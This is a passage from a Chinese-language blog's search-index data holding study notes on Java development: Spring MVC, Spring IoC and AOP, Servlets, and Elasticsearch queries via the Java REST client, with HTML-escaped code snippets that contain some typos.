技术\n可以通过一个注解@Data完成一个实体类对应的getter，setter，toString，equals，hashCode等操作的快速添加 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;!--lombok--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; ","date":"2025-10-12T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251012171949620.png","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-springboot%E5%AE%9E%E7%94%A8%E6%95%99%E7%A8%8B/","title":"SpringBoot"},{"content":"Spring MVC 主要覆盖表述层（Controller）\n简化接收前端参数、响应前端数据 工作流程 接收数据 路径设置 RequestMapping(\u0026quot;path\u0026quot;) 注解\nGetMapping(\u0026quot;...\u0026quot;)\n\u0026hellip;\u0026hellip;\n接收参数 param 参数名和 param 名相同，直接接收\n注解接收 RequestParam(value = \u0026quot;...\u0026quot;,required = \u0026quot;...\u0026quot;)\n多字符串，直接用集合接收\n必须要注解 封装为对象接收\n属性名必须等于参数名 路径传参 1 2 3 4 @RequestMapping(\u0026#34;{account}/{password}\u0026#34;) public String login(@PathVariable String account,@PathVariable String password){ return null; } Json 参数 定义接收的实体类 用 RequestBody 接收 原生 Java 不支持接收 Json\nhandlerMapper 中配置 Json 转换器，EnableWebMVC 用于给RequestMappingHandLerMapping、RequestMappingHandLerAdapter 添加Json处理器 Cookie @CookieValue\n存 Cookie：\n1 2 3 4 5 public String save(HttpServletResponse response){ Cookie cookie = new Cookie(name:\u0026#34;cookiellame\u0026#34;, value:\u0026#34;root\u0026#34;); response.addCookie(cookie); return \u0026#34;ok\u0026#34;; } 请求头 @RequestHeader\n原生 API 对象 共享域对象 Session、ServletContext\n原生获取 SpringMVC 提供\nmodel modeLMap map modeLAndView 响应数据 前后端不分离 不用 ResponseBody，配置 Jsp 模板地址，返回\n转发 return \u0026quot;forward:/jsp/...\u0026quot;\n返回 Json 直接 return User，会被自动封装\n需要 @ResponseBody 注解，不会走视图转换器 ResponseBody + Controller = RestController 返回静态资源 需要配置 Config\n1 2 3 4 5 6 7 //开启静态资源查找 //dispatcherServLet-\u0026gt;handLerMapping找有没有对应的handLer-\u0026gt;【没有-\u0026gt;找有没有静态资源】 @Override public void configurelDefaultServletHandling(DefaultServletHandlerConfigurer configurer）{ configurer.enable(); } Restful 风格 规定路径设计方式、参数传递格式、选择请求方式\n风格特点 每一个URI代表1种资源；\n客户端使用GET、POST、PUT、DELETE4个表示操作方式的动词对服务端资源进行操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资 源，DELETE用来删除资源；\n资源的表现形式是XML或者JSON；\n客户端与服务端之间的交互在请求之间是无状态的，从客户端到服务端的每个请求都必须包含理解请求所必需的信息。\n用请求方式 + URI 来表示操作、对象 路径传参：对应单一资源，如 id 其他扩展 全局异常处理 异常处理分类\n编程式：单独细化处理 声明式：统一处理 1 2 3 4 5 6 7 8 9 10 11 //全局异常发生，会走此类写的handLer！ //@ControLLerAdvice//可以返回逻辑视图转发和重定向的！ no usages @RestControllerAdvice//@ResponseBody直接返回json字符串 public class GlobalExceptionHandler{ //发生异常-\u0026gt;ControLLerAdvice注解的类型-\u0026gt;@ExceptionHandLer（指定的异常）-\u0026gt;handLer no usages @ExceptionHandler(ArithmeticException.class) public ObjectArithmeticExceptionHandler(ArithmeticException e){ //自定义处理异常即可handLer } 拦截器 HandlerIntercepter\n拦截器 Springmvc VS 过滤器 javaWeb:\n相似点 拦截: 必须先把请求拦住，才能执行后续操作 过滤: 拦截器或过滤器存在的意义就是对请求进行统一处理 放行: 对请求执行了必要操作后，放请求过去，让它访问原本想要访问的资源 不同点 工作平台不同 过滤器工作在 Servlet 容器中 拦截器工作在 SpringMVC 的基础上 拦截的范围 过滤器: 能够拦截到的最大范围是整个 Web 应用 拦截器: 能够拦截到的最大范围是整个 SpringMVC 负责的请求 IOC 容器支持 过滤器: 想得到 IOC 容器需要调用专门的工具方法，是间接的 拦截器: 它自己就在 IOC 容器中，所以可以直接从 IOC 容器中装配组件，也就是可以直接得到 IOC 容器的支持 使用 实现 HandlerInterceptor 接口\n修改类配置拦截器 SpringMvcConfig impLements WebMvcConfigurer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 配置拦截 publicvoid addInterceptors(InterceptorRegistry registry){ //配置方案1：拦截全部请求 registry.addInterceptor(new MyInterceptor()); //配置方案2：指定地址拦截.addPathPatterns（\u0026#34;/user/data\u0026#34;);； //*任意一层字符串**任意多层字符串 registry.addInterceptor(new MyInterceptor()) .addPathPatterns(\u0026#34;/user/**\u0026#34;); //配置方案3：排除拦截排除的地址应该在拦截地址内部！ registry.addInterceptor(new MyInterceptor()) .addPathPatterns(\u0026#34;/user/**\u0026#34;).excludePathPatterns(\u0026#34;/user/data1\u0026#34;); } 参数校验 hybernate 框架实现\n非空校验 @Validate\nNotNull：包装类型不为 null NotEmpty：集合类型长度大于 0 NotBlank：字符串不为 null，且不为 \u0026quot;\u0026quot; 通过 BindingResult 绑定错误，不直接返回\n","date":"2025-10-12T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-springmvc/","title":"SpringMVC"},{"content":"概述 Spring FrameWork 特点 非侵入式 控制反转 面向切面编程 容器化管理 组件化 一站式 IOC 控制反转 概述 Inversion of Control\n用容器管理所有 Java 对象的实例化和初始化，控制依赖关系，称为 SpringBean xml 配置文件\n抽象 BeanDefinitionReader 读取\n装配，读取信息，利用反射实例化\nBeanFactory、ApplicationContex 用 Context.getBean(\u0026quot;...\u0026quot;) 来获取\n基于 xml 管理 获取 Bean xml 定义\n1 \u0026lt;bean id=\u0026#34;helloworldone\u0026#34; class=\u0026#34;ccom.atguigu.spring6.bean.He11owor1d\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; Context.getBean(\u0026quot;...\u0026quot;) 获取\n1 2 //根据类型获取接口对应bean UserDaouserDao= context.getBean(UserDao.class); 依赖注入 set 注入 xml 中进行配置 构造器注入 \u0026lt;constructor-arggname=\u0026quot;bnamevalue=\u0026quot;java开发\u0026quot;\u0026gt;\u0026lt;/constructor-arg\u0026gt; 是不是只能注入默认值？\n特殊值注入\n对象中注入其他对象（表示关系） 法一：引入外部/内部类，bean 标签中嵌套 ref 法二：级联赋值，直接嵌套对所注入的对象的属性的赋值 数组类型注入\n配置中的 \u0026lt;array\u0026gt;标签 List 集合属性注入\n先定义 Bean，再用 \u0026lt;list\u0026gt; 标签注入 map 集合属性注入\n\u0026lt;map\u0026gt;\u0026lt;entry\u0026gt;\u0026lt;key\u0026gt; 标签 引用集合类型（？util 整合）\np 命名空间注入\n防止 7.中的util 的名称冲突 引入外部属性 创建外部属性文件 .property\nxml 中配置读取即可\n作用域 配置 scope 来指定作用域\nsingleton 单例 prototype 多例，每次获取时创建 生命周期 FactoryBean 机制 根据接口实现 FactoryBean，自定义 getObjet（）方法返回值，来控制产生的对象\n用于整合第三方框架(?) 基于注解注解管理 开启组件扫描 1 2 \u0026lt;!--开启组件扫描功能--\u0026gt; \u0026lt;context:component-scanbase-package=\u0026#34;com.atguigu.spring6\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; 注解说明 @Autowired 注入 set 方法注入 1 2 3 4 @Autowired public void setUserService(UserService userService) { this.userService = userService; } 构造方法注入\n形参上注入\n根据名称进行注入（而非接口名）\n一个接口有多个实现类时 @Qualifier @Resource 注入 默认根据 name 标签进行注入\n全注解开发 无需使用配置文件，写一个配置类替代配置文件\n1 2 3 4 5 @configuration //@componentscan({\u0026#34;com.atguigu.spring6.controller\u0026#34; //\u0026#34;com.atguigu.spring6.service\u0026#34;,\u0026#34;com.atguigu.spring6.dao\u0026#34;}) @componentscan(\u0026#34;com.atguigu.spring6\u0026#34;) public class Spring6config {} 手写 IoC 反射 获取对象： 1 2 3 4 5 6 7 8 9 10 public void test01(）{ //1 类名.cLass Class clazz1 = Car.class; //2 对象.getCLass() Class clazz2 =newv Car().getclass(); //3 CLass.forName（\u0026#34;全路径\u0026#34;） Class clazz3 = Class.forName( className: \u0026#34;......\u0026#34;); //实例化 Object o = clazz3.getDeclaredConstructor().newInstance(); } 获取方法： 1 2 3 4 5 6 7 8 public void test02() throws Exception { Classclazz = Car.class; 1/获取所有构造 Constructor[]] constructors = clazz.getconstructors(); for (Constructor c:constructors) {......} // 方法名：c.getname() 参数个数(public)：c.getConstructor() // 参数个数(所有)：c.getDeclaredConstructor() } 构造对象： 1 2 3 Constructorc2=（clazz.getDeclaredConstructor(......) c2.setAccessible(true); Car car2 = (Car)c2.newInstance( ..initargs: \u0026#34;捷达\u0026#34;， 15,“白色\u0026#34;); 获取属性： 1 2 3 4 5 6 7 8 Classclazz = Car.class; //获取所有pubLic属性 Field[] fields = clazz.getFields(); //获取所有属性（包含私有属性） Field[] fields = clazz.getDeclaredFields(); for (Field field:fields）{ System.out.println(field.getName()); } 操作方法 1 2 3 4 5 6 7 8 private方法 Method[] methodsAll = clazz.getDeclaredMethods(); for (Method m:methodsAll) { //执行方法 runI if(m.getName().equals(\u0026#34;run\u0026#34;)) { m.setAccessible(true); m.invoke(car) ; } 实现 步骤 创建注解：@Bean创建对象、@Di属性注入\n创建bean容器接口：ApplicationContext\n定义方法，返回对象\n实现bean容器接口：返回对象、根据包规则加载bean\n配置 @Bean\n1 2 3 4 @Target(ElementType.TYPE) // 目标 @Retention(RetentionPolicy.RUNTIME) // 运行范围 public @interface Bean } @Di\nApplicationCotext 接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //创建有参数构造，传递包路径，设置包扫描规则 //扫描当前包及其子包，哪个类有@Bean注解，把这个类通过反射实例化 public AnnotationApplicationContext implement ApplicationContext(String basePackage) { // 路径转义,点替换为斜杠 String packagePath = basePackage.replaceAll(\u0026#34;\\\\.\u0026#34;,\u0026#34;\\\\\\\\\u0026#34;) // 获取绝对路径 Enumeration\u0026lt;URL\u0026gt; urls = Thread.currentThread().getContextClassLoader()·getResources(packagePath); while(urls.hasMoreElements()) { URL url = urls.nextElement(); String filePath= URLDecoder.decode(url.getFile(), \u0026#34;utf-8\u0026#34;); loadBean(new File(filePath)); // 实现 loadBean 方法 } loadDi(); // 实现 loadDi 方法 } public static void loadBean(File file){ // 1.判断当前内容是否是文件夹 // 2.是，则获取当前文件夹所有内容 // 3.文件夹为空，返回空 // 4.文件夹不为空，遍历文件夹所有内容 // 4.1.遍历每个File对象，继续判断，如果还是文件，递归 // 4.2.不是文件夹，是文件 // 4.3.得到包文件 + 类名称部分 // 4.4.判断当前文件类型是否.cLass // 4.5.如果是.cLass类型，把路径\\替换成。把.cLass去掉 // 4.6.判断类上面是否有注解@Bean，如果有实例化过程 // 4.7.把对象实例化之后，放到map集合bearFactory } private void loadDi() { //实例化对象在beanFactory的map集合里面 //1遍历beanFactory的map集合 //2获取map集合每个对象（vaLue），每个对象属性获取到 //3遍历得到每个对象属性数组，得到每个属性 //4判断属性上面是否有@Di注解 //5如果有@Di注解，把对象进行设置（注入） } AOP 面向切面 引入 问题：\n要抽取的代码在方法内部，无法通过抽取到父类解决 代理模式：\n在调用目标方法时，不直接调用，而是通过代理类调用\n代理：将非核心逻辑剥离出来以后，封装这些非核心逻辑的类、对象、方法\n目标：代理“套用\u0026quot;了非核心逻辑代码的类、对象、方法\n优化：\n静态代理：再创建一个代理类，实现其他方法，再调用原有类\n问题：还是僵化，无法动态调整 动态代理：创建动态代理对象 ProxyFactory，用反射统一管理\nAOP：通过预编译和动态代理，在不修改程序源码情况下，给程序添加功能\n抽取横切关注点\n整合横切关注点为通知方法\n将各种通知方法整合为切面类\n基于注解实现 分类：\nJDK：代理对象和目标对象实现相同接口（目标有接口时）\ncglib：通过继承目标类\nAspectJ：基于静态代理，将代理逻辑植入编译的字节码文件，效果是动态的，Spring借助了其中的注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @Aspect//切阻尖 @Component //ioc容器 public class LogAspect { //设置切入点和通知类型 //通知类型： //前置 @Before(value = \u0026#34;切入点表达式\u0026#34;) public void beforeMethod(JoinPoint joinPoint) { StringmethodName = joinPoint.getSignature().getName(); Object[] args = jqinPoint.getArgs(); // 获取连接点的信息 } //返回 @AfterReturning //异常 @AfterThrowing //后置 @After() //环绕 @Around() } @Order 控制切面优先级\n基于 xml 实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;context:component-scanbase-package=\u0026#34;com.atguigu.aop.xml\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;aop:config\u0026gt; \u0026lt;!--配置切面类--\u0026gt; \u0026lt;aop:aspect ref=\u0026#34;loggerAspect\u0026#34;\u0026gt; \u0026lt;aop:pointcut id=\u0026#34;pointcut\u0026#34; expression=\u0026#34;execution(*com.atguigu.aop.xml.calculatorImpl.*(..))\u0026#34;/\u0026gt; \u0026lt;aop:before method=\u0026#34;beforeMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:before\u0026gt; \u0026lt;aop:after method=\u0026#34;afterMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after\u0026gt; \u0026lt;aop:after-returning method=\u0026#34;afterReturningMethod\u0026#34;returning=\u0026#34;result\u0026#34;pointcut- ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after-returning\u0026gt; \u0026lt;aop:after-throwing method=\u0026#34;afterThrowingMethod\u0026#34;throwing=\u0026#34;ex\u0026#34;pointcut- ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after-throwing\u0026gt; \u0026lt;aop:around method=\u0026#34;aroundMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:around\u0026gt; \u0026lt;/aop:aspect\u0026gt; \u0026lt;/aop:config\u0026gt; 事务 JDBC Template 增：\n1 2 3 4 5 6 7 //1添加操作 //第一步编写sqL语句 String Sql = \u0026#34;INSERT INTO t_emp VALUES(NULL,?,?,?)\u0026#34;;I //第二步调用jdbcTempLate的方法，传入相关参数 //Object[］ params ={\u0026#34;东方不败\u0026#34;，20，\u0026#34;未知\u0026#34;}; //int rows = jdbcTemplate.update(sql,params); int rows = jdbcTemplate.update(sql, ..args:\u0026#34;东方不败\u0026#34;，20，\u0026#34;未知\u0026#34;); 改：\n1 2 3 //2修改操作 String sql =\u0026#34;update t_emp set name=? where id=?\u0026#34;; int rows =jdbcTemplate.update(sql, ..args: \u0026#34;林平之atguigu\u0026#34;,3）; 删：\n1 2 3 //3删除操作 String sql\u0026#39;deletefromt_empwhere id=?\u0026#34;; introws=jdbcTemplate.update(sql, ..args: 3); 查：\n1 2 3 4 5 public void testSelectObject() { String sql=\u0026#34;select*from t_emp List\u0026lt;Emp\u0026gt;list = jdbcTemplate.query(sql, new BeanPropertyRowMapper\u0026lt;\u0026gt;(Emp.class)); } 基于注解的声明式事务 保证事务的一致性、隔离性、持久性、原子性\nTransactional 标签声明事务，可以设置：\n只读 超时 回滚策略，哪些异常不回滚 隔离级别 传播行为，事务方法之间调用的处理逻辑 全注解 不用 XML，改用配置类\n","date":"2025-10-10T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-spring/","title":"Spring"},{"content":"Tomcat 服务器容器，将服务部署（deploy）到容器内\n目录结构：\nbin 可执行文件目录 conf 配置文件目录 webapps 项目部署的目录 项目内容存放到 webapps-name-WEBINF 文件夹下，即可访问 work 工作目录 Servlet 获取参数 在 web.xml 中定义 servlet-mapping，指定接收 url 请求对应的类 现在支持注解注册 @WebServlet(\u0026quot;\\...\u0026quot;) 定义类，继承 HttpServlet ，实现 doPost 方法 再调用 DAO、DAOImpl 更改数据库 继承关系 Servlet 接口\nvoid init（config） 初始化方法\nvoid service(request,response) 服务方法 （收到请求自动调用）\nvoid destory() 销毁方法\nServlet 父类、抽象类\ngenericServlet 抽象类，用于处理子类没有实现的方法（抛错误） httpServlet 实现类，具体处理逻辑 生命周期 默认情况下：\n第一次接收请求时，这个servlet会进行实例化（调用构造方法）、初始化（调用init())）、然后服务（调用service()）\n默认只会有一个 Servlet 示例 单例的，线程不安全的 \u0026ndash;\u0026gt; 尽量不在 Servlet 中定义、修改成员变量 第二次请求开始，每一次都是服务\n当容器关闭时，其中的所有的 servlet 实例会被销毁，调用销毁方法\nHttp 协议 超文本传输协议，是无状态的\n请求内容\n请求行 方式、URL、HTTP版本 请求头 Host、Referer、Cookie…… 请求体 响应内容\n响应行 协议、状态码（200）、响应状态（ok） 响应消息头 Server、Content-type…… 响应体 Session 会话跟踪技术，解决 http 的无状态问题。\nrequest.getSession，获取、自动分配 Session\nsession.setAttribute，保存 session 作用域 服务器端内部转发和客户端重定向 内部转发：同一请求、不同服务组件之间转发处理\ngetdepatcher\u0026hellip; 重定向：返回客户端一个新的服务，使其重新请求\nredirect\u0026hellip; Thymeleaf 视图模板技术 辅助渲染从 DAO 获取的数据到前端\n引入模板 将查询的数据动态显示 th: if... unless... each... text...\n保存作用域 request：一次请求有效 session：一次会话范围有效 application：一次应用程序范围内有效（上下文） 小项目 编辑、修改特定信息\n变量的获取 url/(fid=${name.fid}) 跳转到编辑页面，获取数据 MVC Servlet优化 Servlet 整合 问题：\nServlet 组件过多 优化：\n将各种 Servlet 整合到一个 Controller 中，作为方法 用路径区分操作要求 通过 Switch ... case ... 进行跳转，执行 DAO 再用反射优化，this.getClass().getDeclaredMethods(); DispatcherServlet 中央控制器 抽取路径、反射代码 拦截、处理指定请求，修改路径再传输到 Controller\n将每个 Controller 的反射代码再抽取到父类\n注意，这样的 Controller 继承 DispatcherServlet，不能再自动调用 Init（），需要另外处理\n解析 xml 配置文件 定位指定 Controller 读取 bean 配置，整合为 map\u0026lt;id,object\u0026gt;，寻找指定方法 抽取重定向 Controller处理后，return 一个字符串，再交给 DispatcherServlet 处理\n抽取传入参数 获取参数的过程同一抽取到 DispatcherServlet\njdk 8 新特性，通过反射获取方法参数的方法名 将得到的参数拆包、赋值、类型转换后，再传递给 Controller 初始化 重写 init（）方法，通过注解或 xml，向初始化方法中添加参数\nService model：模型层 pojo/vo、DAO（数据访问对象，单精度方法）、BO（业务对象） 在 Controller 与 DAO 间添加 Service 层 controller：控制 view：视图 IOC 控制反转 实现 Bean 的自动装配，整理 xml 映射文件\n将解析出的实例创建并存放在 beanmap 中，beanmap 存放在 BeanFactory 中，改变示例生命周期（存放到 IOC 容器中），需要时取用即可 1 2 3 Field propertyField = beanClazz.getDeclaredField(propertyName); propertyField.setAccessible(true); propertyField.set(beanobj,refobj); Filter 过滤器 拦截请求、响应\n实现 Filter 接口，@WebFilter(\u0026quot;...\u0026quot;)\n改写 doFilter，后放行（执行 Service）filterchain.doFilter(...)\n接收到 Service 后，继续执行完 doFilter\n过滤器链\n执行顺序：根据全类名、xml 配置的顺序 事务管理 一个 Service 需要作为一个整体，操作多个数据库时要保证同时成功或失败\n将 try …… catch 放到 Filter 当中处理，统一回滚 用 ThreadLocal 来保证对象、线程（Connection）的同一性 OpenSessionInViewFilter 的实现 事务管理封装为 TransactionManager，实现开启、提交、回滚事务的方法\n本来分开的 commit、rollback 等，手动进行管理 注意内部不能 catch 异常，需要都交给 Filter 处理 或者 catch 为新的异常抛出 ThreadLocal 的实现源码 1 2 3 4 5 6 7 8 public void set(T value) Thread t=Thread.currentThread();//获取当前的线程 ThreadLocalMap map = getMap(t);//每一个线程都维护各自的一个容器(ThreadLocalMap) iff (map != null) map.set((this)value);//用map，支持多个对象存储 else createMap(t, value) ; } Listener 监听器 监听各种对象的创建、销毁；保存作用域的变化；对象在 Session 中的创建与移除、序列化与反序列化\n将 IOC 整合到 Listener 中（监听上下文启动），提前初始化，提高响应速度（减慢启动速度） QQZone 笔记 数据库 设计 先写出功能，再分析：\n抽取实体：用户登录信息、用户详情信息、日志、回贴、主人回复 分析其中属性 用户登录信息：账号、密码、头像、昵称 用户详情信息：真实姓名、星座、血型、邮箱、手机号 日志：标题、内容、日期、作者 回复：内容、日期、作者、日志 分析实体之间关系 一对一 or 一对多 or 多对多 范式 第一范式：列不可再分（空间尽量小）\n第二范式：一张表只表达一层含义\n第三范式：表中每一列和逐渐都是直接依赖关系（与多表连接查询权衡）\n根据数据库查询频次、量，调整规范性 主键尽量不与业务产生联系\n直接用自增组件 实体类 - POJO 定义对应属性，有关系的要对应\n1 2 private UserDetail userDetail//1:1 private List\u0026lt;Topic\u0026gt; topiqList//1:N 数据层 - DAO 接口、impl，实现查询\n业务层 - Service 接口、impl，整合 DAO 层\n","date":"2025-10-09T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-javaweb-servlet/","title":"JavaWeb-Servlet"},{"content":"初识 分布式的开源搜索引擎\n提供 Restful 接口，所有语言均可调用\nELK技术栈：\n结合 kibana（可视化）、Logstash、Beats 用于日志分析、事实监控等 倒排索引 正向索引：\n传统数据库使用，查询需要逐一遍历 倒排索引：\ndocument：文档，每条数据就是一个文档 term：词条，由文档按语义划分，有限且唯一 先搜词条，再根据词条找文档 IK分词器 作为 ES 插件导入\n根据现有词典（可拓展）对文档进行划分\n基础概念 索引库：\n相同类型的文档（Json存储）的集合 映射：\n索引库中对文档的约束 mapping 属性 type：字段数据类型\nindex：是否创建索引\nanalyzer：分词器\npropertis：嵌套的子字段\n索引库操作 RESTFUL 规范\n不同请求方式对应不同请请求类型 创建索引库和mapping的请求语法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 PUT /索引库名称 { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;字段名1\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34; }, \u0026#34;字段名2\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;, \u0026#34;index\u0026#34;: \u0026#34;false\u0026#34; }, \u0026#34;字段名3\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;子字段\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; } } }, // …略 } } } 支持 put、get、delete\n文档操作 新增文档：\n1 2 3 4 5 6 7 8 9 10 POST /索引库名/_doc/文档id { \u0026#34;字段1\u0026#34;: \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34;: \u0026#34;值2\u0026#34;, \u0026#34;字段3\u0026#34;: { \u0026#34;子属性1\u0026#34;: \u0026#34;值3\u0026#34;, \u0026#34;子属性2\u0026#34;: \u0026#34;值4\u0026#34; }, // … } 修改\nput 全量修改，先删除再新建 post 增量修改 批处理\n1 2 3 4 5 6 7 8 9 10 POST /_bulk { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;delete\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;test\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;2\u0026#34; } } { \u0026#34;update\u0026#34; : {\u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_index\u0026#34; : \u0026#34;test\u0026#34;} } { \u0026#34;doc\u0026#34; : {\u0026#34;field2\u0026#34; : \u0026#34;value2\u0026#34;} } DSL 查询 分类：\n叶子查询：特定字段查询特定值 复合查询：逻辑方式组合叶子查询 基本语法：\n1 2 3 4 5 6 7 8 GET /indexName/_search { \u0026#34;query\u0026#34;: { \u0026#34;查询类型\u0026#34;: { \u0026#34;查询条件\u0026#34;: \u0026#34;条件值\u0026#34; } } } 叶子 全文检索：分词 match 查询 mult_match 允许同时查询多个字段 精确查询：不分词，直接精确匹配 term 查询，整体到词条中寻找 range 地理查询：用于搜索地理位置 复合 基于逻辑运算组合叶子 bool：子句must、should、must_not、filer 基于算法修改查询时的文档相关性算分，从而改变排名 function_score dis_max 排序和分页 排序：\n添加 sort 标签，默认按照 _score 排序 分页：\n添加 from 、size 深度分页问题： es 一般对数据进行分片存储，导致查询数据时需要汇总各个分片的数据 解决方案：\nsearch after，分页时需要排序，每次查询从上一次的排序值开始。但只能向后逐页查询 scrool，将排序数据形成快照，保存在内存 设置上限 高亮显示 在搜索结果中把搜索关键字突出显示\nfield标签加上pre_tags、post_tags Java 客户端 JavaRestClient\n初始化 1 2 3 RestHighLevelClient client = new RestHighLevelClient(RestClient.builder( HttpHost.create(\u0026#34;http://192.168.150.101:9200\u0026#34;) )); Mapping 映射 结合业务分析所需字段（区分是否需要和是否搜索）\n搜索字段 排序字段 展示字段 索引库操作 基于 RestFul格式：\n1 2 3 4 5 6 7 8 9 @Test void testCreateHotelIndex() throws IOException { // 1. 创建Request对象 CreateIndexRequest request = new CreateIndexRequest(\u0026#34;items\u0026#34;); // 2. 请求参数，MAPPING_TEMPLATE是静态常量字符串，内容是JSON格式请求体 request.source(MAPPING_TEMPLATE, XContentType.JSON); // 3. 发起请求 client.indices().create(request, RequestOptions.DEFAULT); } 文档操作 新增文档的 API\n1 2 3 4 5 6 7 8 9 @Test void testIndexDocument() throws IOException { // 1. 创建request对象 IndexRequest request = new IndexRequest(\u0026#34;indexName\u0026#34;).id(\u0026#34;1\u0026#34;); // 2. 准备JSON文档 request.source(\u0026#34;{\\\u0026#34;name\\\u0026#34;: \\\u0026#34;Jack\\\u0026#34;, \\\u0026#34;age\\\u0026#34;: 21}\u0026#34;, XContentType.JSON); // 3. 发送请求 client.index(request, RequestOptions.DEFAULT); } 文档批处理 add 多个 index，然后统一请求即可\n完成批量导入数据 1 2 3 4 5 6 7 8 9 10 11 void testBulk() throws IOException { // 1. 创建Bulk请求 BulkRequest request = new BulkRequest(); // 2. 添加要批量提交的请求：这里添加了两个新增文档的请求 request.add(new IndexRequest(\u0026#34;indexName\u0026#34;) .id(\u0026#34;101\u0026#34;).source(\u0026#34;json source\u0026#34;, XContentType.JSON)); request.add(new IndexRequest(\u0026#34;indexName\u0026#34;) .id(\u0026#34;102\u0026#34;).source(\u0026#34;json source2\u0026#34;, XContentType.JSON)); // 3. 发起bulk请求 client.bulk(request, RequestOptions.DEFAULT); } 准备文档数据\n准备请求参数\n发送请求\nRTL 查询 SearchRequest 对象，发请求\n解析结果\n得到 Hits 属性，结果是数组\n复合、排序、分页 用指定对象、设置指定参数即可\nboolquery、source\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Test void testBool() throws IOException { // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.准备bool查询 BoolQueryBuilder bool = QueryBuilders.boolQuery(); // 2.2.关键字搜索 bool.must(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.3.品牌过滤 bool.filter(QueryBuilders.termQuery(\u0026#34;brand\u0026#34;, \u0026#34;德亚\u0026#34;)); // 2.4.价格过滤 bool.filter(QueryBuilders.rangeQuery(\u0026#34;price\u0026#34;).lte(30000)); request.source().query(bool); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 分页：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @Test void testPageAndSort() throws IOException { int pageNo = 1, pageSize = 5; // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.搜索条件参数 request.source().query(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.2.排序参数 request.source().sort(\u0026#34;price\u0026#34;, SortOrder.ASC); // 2.3.分页参数 request.source().from((pageNo - 1) * pageSize).size(pageSize); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 handleResponse(response); } 高亮：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Test void testHighlight() throws IOException { // 1.创建Request SearchRequest request = new SearchRequest(\u0026#34;items\u0026#34;); // 2.组织请求参数 // 2.1.query条件 request.source().query(QueryBuilders.matchQuery(\u0026#34;name\u0026#34;, \u0026#34;脱脂牛奶\u0026#34;)); // 2.2.高亮条件 request.source().highlighter( SearchSourceBuilder.highlight() .field(\u0026#34;name\u0026#34;) .preTags(\u0026#34;\u0026lt;em\u0026gt;\u0026#34;) .postTags(\u0026#34;\u0026lt;/em\u0026gt;\u0026#34;) ); // 3.发送请求 SearchResponse response = client.search(request, RequestOptions.DEFAULT); // 4.解析响应 